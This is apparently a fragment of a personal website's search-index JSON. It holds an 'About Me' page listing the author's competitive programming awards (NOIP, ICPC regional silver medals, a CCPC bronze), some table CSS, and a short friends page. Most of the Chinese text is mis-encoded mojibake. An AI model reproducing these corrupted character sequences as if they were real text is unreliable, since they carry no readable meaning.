0;","categories":["Solution"]},{"title":"About Me","path":"/Myself/index.html","content":"Self-IntroductionMy Githubè¶…é—»é€¸äº‹ EducationPrimaryJunior HighSenior HighUniverisity Programming CompetitionåºŸç‰©ç”Ÿæˆå™¨çš„ CF/AT ä½¬ä»¬çš„ CF è·å¥–ä¿¡æ¯ æ¯”èµ›å¹´ä»½ æ¯”èµ›åç§° å¥–é¡¹ 2021 NOIP äºŒç­‰ 2022 NOIP äºŒç­‰ 2023 NOIP ä¸€ç­‰ 2025 ã€Œåä¸ºæ¯ã€ç¬¬ 50 å±Š ICPC å›½é™…å¤§å­¦ç”Ÿç¨‹åºè®¾è®¡ç«èµ›åŒºåŸŸèµ›å—äº¬ç«™ é“¶ç‰Œ 2025 ã€Œåä¸ºæ¯ã€ç¬¬ 50 å±Š ICPC å›½é™…å¤§å­¦ç”Ÿç¨‹åºè®¾è®¡ç«èµ›åŒºåŸŸèµ›æ­¦æ±‰ç«™ é“¶ç‰Œ 2025 ç¬¬ 11 å±Š CCPC ä¸­å›½å¤§å­¦ç”Ÿç¨‹åºè®¾è®¡ç«èµ›é‡åº†ç«™ é“œç‰Œ .award-info { padding: 20px; max-width: 800px; margin: 0 auto; } .prize-table { width: 100%; border-collapse: collapse; margin: 20px 0; } .prize-table th, .prize-table td { padding: 12px 15px; border: 1px solid #ddd; text-align: left; } .prize-table th { background-color: #f5f5f5; font-weight: bold; } .prize-table tr:nth-child(even) { background-color: #f9f9f9; } .prize-table tr:hover { background-color: #f0f0f0; } .note { font-size: 12px; color: #666; margin-top: 10px; font-style: italic; }"},{"title":"My Favorite","path":"/favorite/index.html","content":"FriendsJr-zlwSkyzhou"}]